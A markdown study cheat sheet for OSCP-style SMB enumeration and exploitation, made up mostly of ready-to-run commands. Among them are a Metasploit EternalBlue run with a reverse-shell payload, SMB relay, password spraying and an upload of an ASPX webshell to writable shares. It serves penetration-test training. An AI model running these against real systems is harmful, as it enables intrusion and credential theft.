# OSCP SMB Enumeration & Exploitation Complete Guide

## Table of Contents
1. [SMB Fundamentals](#smb-fundamentals)
2. [Initial Discovery & Port Scanning](#initial-discovery--port-scanning)
3. [SMB Enumeration Tools & Techniques](#smb-enumeration-tools--techniques)
4. [Share Access & File Operations](#share-access--file-operations)
5. [Authentication Methods](#authentication-methods)
6. [Common Vulnerabilities & Exploits](#common-vulnerabilities--exploits)
7. [Post-Exploitation Techniques](#post-exploitation-techniques)
8. [Troubleshooting Common Issues](#troubleshooting-common-issues)
9. [OSCP Exam Tips](#oscp-exam-tips)
10. [Quick Reference Commands](#quick-reference-commands)

---

## SMB Fundamentals

### What is SMB?
- **Server Message Block (SMB)** - Network protocol for file/printer sharing
- **Ports**: 139 (NetBIOS-SSN), 445 (Microsoft-DS)
- **Versions**: SMBv1 (legacy, vulnerable), SMBv2/3 (modern, more secure)
- **Common on**: Windows systems, Linux/Unix (via Samba)

### SMB vs NetBIOS
- **NetBIOS**: Network naming service (port 137-139)
- **SMB over NetBIOS**: Legacy implementation (port 139)
- **SMB over TCP**: Direct SMB (port 445)

---

## Initial Discovery & Port Scanning

### Quick Port Discovery
```bash
# Quick scan for SMB ports
nmap -p 139,445 -T4 --open <target>

# Comprehensive SMB discovery
nmap -p 139,445 -sC -sV -T4 <target>

# Script scan for SMB info
nmap --script smb-protocols,smb-security-mode -p 139,445 <target>
```

### SMB Version Detection
```bash
# Detect SMB version and OS
nmap --script smb-os-discovery -p 139,445 <target>

# Metasploit SMB version scanner
use auxiliary/scanner/smb/smb_version
set RHOSTS <target>
run
```

---

## SMB Enumeration Tools & Techniques

### 1. NetExec (formerly CrackMapExec) - **PREFERRED TOOL**
```bash
# Basic SMB enumeration
netexec smb <target>

# Check for null sessions and guest access
netexec smb <target> -u '' -p ''
netexec smb <target> -u 'guest' -p ''

# Enumerate shares
netexec smb <target> -u '' -p '' --shares
netexec smb <target> -u 'guest' -p '' --shares

# With credentials
netexec smb <target> -u <username> -p <password> --shares

# User enumeration
netexec smb <target> -u '' -p '' --users
netexec smb <target> -u <username> -p <password> --users

# RID bruteforce
netexec smb <target> -u 'guest' -p '' --rid-brute

# Password policy
netexec smb <target> -u '' -p '' --pass-pol
```

### 2. smbclient - **ESSENTIAL FOR FILE ACCESS**
```bash
# List shares (null session)
smbclient -L //<target> -N
smbclient -L //<target> -U ""

# List shares with credentials
smbclient -L //<target> -U <username>%<password>

# Connect to specific share
smbclient //<target>/<share> -N
smbclient //<target>/<share> -U <username>%<password>

# Connect with domain
smbclient //<target>/<share> -U <domain>/<username>%<password>

# Execute single command
smbclient //<target>/<share> -N -c 'ls'
smbclient //<target>/<share> -N -c 'cd folder; ls'
```

### 3. enum4linux-ng - **COMPREHENSIVE ENUMERATION**
```bash
# Full enumeration
enum4linux-ng -A <target>

# Simple enumeration without NetBIOS lookup
enum4linux-ng -As <target>

# With credentials
enum4linux-ng -u <username> -p <password> -A <target>

# Specific enumeration
enum4linux-ng -U -S -G -P <target>  # Users, Shares, Groups, Password Policy
```

### 4. smbmap - **SHARE PERMISSIONS**
```bash
# Basic share enumeration
smbmap -H <target>

# Recursive listing
smbmap -H <target> -R

# With credentials
smbmap -H <target> -u <username> -p <password>

# Download specific file
smbmap -H <target> -u <username> -p <password> -A <filename>

# Execute command
smbmap -H <target> -u <username> -p <password> -x 'whoami'
```

### 5. rpcclient - **RPC ENUMERATION**
```bash
# Null session
rpcclient -U "" -N <target>

# With credentials
rpcclient -U <username> <target>

# Common rpcclient commands (once connected):
srvinfo          # Server information
enumdomusers     # Enumerate domain users
enumdomgroups    # Enumerate domain groups
querydominfo     # Domain information
getdompwinfo     # Password policy
lsaenumsid       # Enumerate SIDs
```

### 6. Nmap SMB Scripts
```bash
# All SMB enumeration scripts
nmap --script smb-enum* -p 139,445 <target>

# Specific enumeration
nmap --script smb-enum-shares,smb-enum-users -p 139,445 <target>
nmap --script smb-enum-domains,smb-enum-groups -p 139,445 <target>

# Vulnerability scanning
nmap --script smb-vuln* -p 139,445 <target>

# OS discovery
nmap --script smb-os-discovery -p 139,445 <target>
```

---

## Share Access & File Operations

### smbclient Interactive Commands
```bash
# Navigation
ls                    # List files/directories
cd <directory>        # Change directory
pwd                   # Print working directory

# File operations
get <filename>        # Download single file
mget <pattern>        # Download multiple files
put <localfile>       # Upload file
mput <pattern>        # Upload multiple files

# Directory operations
mkdir <dirname>       # Create directory
rmdir <dirname>       # Remove directory

# Settings
prompt off           # Disable prompts for mget/mput
recurse on          # Enable recursive operations
mask <pattern>      # Set file mask

# Local operations
lcd <path>          # Change local directory
lpwd                # Show local directory
! <command>         # Execute local shell command

# File viewing (from inside smbclient)
more <filename>     # View file contents (if supported)
! cat <localfile>   # View downloaded file locally
```

### Batch Operations
```bash
# Download all files from share
smbclient //<target>/<share> -N -c "prompt off; recurse on; mget *"

# Upload file to share
smbclient //<target>/<share> -N -c "put /path/to/local/file"

# Create directory and upload
smbclient //<target>/<share> -N -c "mkdir backup; cd backup; put /path/to/file"
```

---

## Authentication Methods

### 1. Null Sessions
```bash
# Various null session attempts
smbclient -L //<target> -N
smbclient -L //<target> -U ""
smbclient -L //<target> -U "" -N
netexec smb <target> -u '' -p ''
```

### 2. Guest Access
```bash
# Guest user attempts
smbclient -L //<target> -U "guest"
netexec smb <target> -u 'guest' -p ''
netexec smb <target> -u 'guest' -p 'guest'
```

### 3. Username=Password
```bash
# Try username as password
netexec smb <target> -u <username> -p <username>

# Common weak credentials
netexec smb <target> -u 'admin' -p 'admin'
netexec smb <target> -u 'administrator' -p 'administrator'
```

### 4. Domain Authentication
```bash
# Domain user
smbclient //<target>/<share> -U <domain>/<username>%<password>
netexec smb <target> -u <username> -p <password> -d <domain>

# Local authentication (bypass domain)
netexec smb <target> -u <username> -p <password> --local-auth
```

---

## Common Vulnerabilities & Exploits

### 1. MS17-010 (EternalBlue)
```bash
# Scan for vulnerability
nmap --script smb-vuln-ms17-010 -p 139,445 <target>

# Metasploit exploitation
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your-ip>
run
```

### 2. SMB Relay Attacks
```bash
# Check for SMB signing
nmap --script smb-security-mode -p 139,445 <target>
netexec smb <target> --gen-relay-list relay_targets.txt

# Responder + ntlmrelayx
responder -I <interface> -rdwv
ntlmrelayx.py -tf relay_targets.txt -smb2support
```

### 3. Password Spraying
```bash
# Spray passwords across users
netexec smb <target> -u users.txt -p 'Password123!' --continue-on-success
netexec smb <target> -u users.txt -p passwords.txt --continue-on-success

# Metasploit
use auxiliary/scanner/smb/smb_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

---

## Post-Exploitation Techniques

### 1. File Search & Download
```bash
# Search for interesting files
smbclient //<target>/<share> -N -c "recurse on; ls *pass*"
smbclient //<target>/<share> -N -c "recurse on; ls *config*"

# Download everything
smbmap -H <target> -u <username> -p <password> -R --download
```

### 2. Share Mounting (Linux)
```bash
# Mount SMB share
mkdir /mnt/smb
mount -t cifs //<target>/<share> /mnt/smb -o username=<user>,password=<pass>

# Browse mounted share
find /mnt/smb -type f -name "*.txt" 2>/dev/null
grep -r "password" /mnt/smb/ 2>/dev/null
```

### 3. Windows Post-Exploitation
```powershell
# From Evil-WinRM or cmd shell
net share                    # List local shares
net use                      # Show mapped drives
dir \\<target>\<share>       # Browse remote share

# Map network drive
net use Z: \\<target>\<share> /user:<username> <password>

# Copy files
copy "\\<target>\<share>\file.txt" C:\temp\
xcopy "\\<target>\<share>\*" C:\temp\ /s /e
```

---

## Troubleshooting Common Issues

### 1. "NT_STATUS_ACCESS_DENIED"
```bash
# Try different authentication methods
smbclient -L //<target> -U "" -N
smbclient -L //<target> -U "guest" -N
smbclient -L //<target> -U <username>%<password>

# Check SMB version compatibility
echo 'client min protocol = NT1' >> /etc/samba/smb.conf
```

### 2. "NT_STATUS_RESOURCE_NAME_NOT_FOUND"
```bash
# This is often normal - SMB1 workgroup listing fails
# Focus on share enumeration instead
smbclient -L //<target> -N  # This part usually works

# Try direct share access
smbclient //<target>/C$ -N
smbclient //<target>/ADMIN$ -N
```

### 3. Protocol Negotiation Failed
```bash
# Force older protocols
smbclient -L //<target> -N --option='client min protocol=NT1'

# Edit SMB config
echo 'client min protocol = NT1' >> /etc/samba/smb.conf
echo 'client max protocol = SMB3' >> /etc/samba/smb.conf
```

### 4. Connection Timeouts
```bash
# Specify port explicitly
smbclient -L //<target> -p 445 -N
smbclient -L //<target> -p 139 -N

# Use IP instead of hostname
smbclient -L //<ip> -N
```

---

## OSCP Exam Tips

### 1. Enumeration Methodology
1. **Always try multiple tools** - smbclient might work when others fail
2. **Test both ports** - 139 and 445 may have different access
3. **Try various authentication** - null, guest, username=password
4. **Use -W flag** for domains: `smbclient -L //<target> -U '' -W <domain>`

### 2. Common OSCP SMB Scenarios
- **Anonymous/Guest access** to shares with sensitive files
- **Writable shares** for payload upload
- **Scripts$ and SYSVOL** shares often contain credentials
- **Users$ shares** with user profile information
- **Print$ shares** sometimes writable

### 3. Key Files to Look For
```bash
# Configuration files
*.conf, *.config, *.ini, *.xml

# Scripts with hardcoded credentials
*.ps1, *.bat, *.vbs, *.py

# Database files
*.db, *.mdb, *.sqlite

# Text files with passwords
*pass*, *cred*, *login*, *user*

# Registry exports
*.reg

# Group Policy files
Groups.xml, Services.xml, Scheduledtasks.xml
```

### 4. Quick Win Commands
```bash
# Try these first on any SMB service
netexec smb <target> -u '' -p '' --shares
netexec smb <target> -u 'guest' -p '' --shares
smbclient -L //<target> -N
smbclient -L //<target> -U ""

# If you find writable shares
smbclient //<target>/<writableshare> -N -c "put /usr/share/webshells/aspx/cmdasp.aspx"
```

---

## Quick Reference Commands

### Discovery & Enumeration
```bash
# Port scan
nmap -p 139,445 -sC -sV <target>

# Version detection
nmap --script smb-os-discovery -p 139,445 <target>

# NetExec enumeration
netexec smb <target> -u '' -p '' --shares --users

# Comprehensive enum
enum4linux-ng -A <target>
```

### Share Access
```bash
# List shares
smbclient -L //<target> -N

# Connect to share
smbclient //<target>/<share> -N

# Batch download
smbclient //<target>/<share> -N -c "prompt off; recurse on; mget *"
```

### Vulnerability Scanning
```bash
# All SMB vulnerabilities
nmap --script smb-vuln* -p 139,445 <target>

# Specific vulnerabilities
nmap --script smb-vuln-ms17-010 -p 139,445 <target>
nmap --script smb-vuln-ms08-067 -p 139,445 <target>
```

### Authentication Testing
```bash
# Null session
netexec smb <target> -u '' -p ''

# Guest access
netexec smb <target> -u 'guest' -p ''

# Password spray
netexec smb <target> -u users.txt -p 'Password123!'
```

### File Operations in smbclient
```bash
# Inside smbclient session
ls                    # List files
get <file>           # Download file
put <file>           # Upload file
more <file>          # View file (if supported)
! cat <localfile>    # View local file
prompt off           # Disable prompts
mget *               # Download all files
```

---

## Additional Resources

### SMB Wordlists
- `/usr/share/seclists/Discovery/Network-Protocols/smb-shares-default.txt`
- `/usr/share/seclists/Usernames/top-usernames-shortlist.txt`
- `/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt`

### Useful Scripts Location
- `/usr/share/nmap/scripts/smb*`
- `/usr/share/metasploit-framework/modules/auxiliary/scanner/smb/`

### Common Default Shares
- `C$` - Administrative share (C: drive)
- `ADMIN$` - Administrative share
- `IPC$` - Inter-process communication
- `SYSVOL` - Domain-wide shared directory
- `NETLOGON` - Domain logon scripts
- `print$` - Printer drivers

---

*Remember: Always ensure you have proper authorization before testing SMB services. This guide is for educational and authorized penetration testing purposes only.*

**Last Updated**: September 2025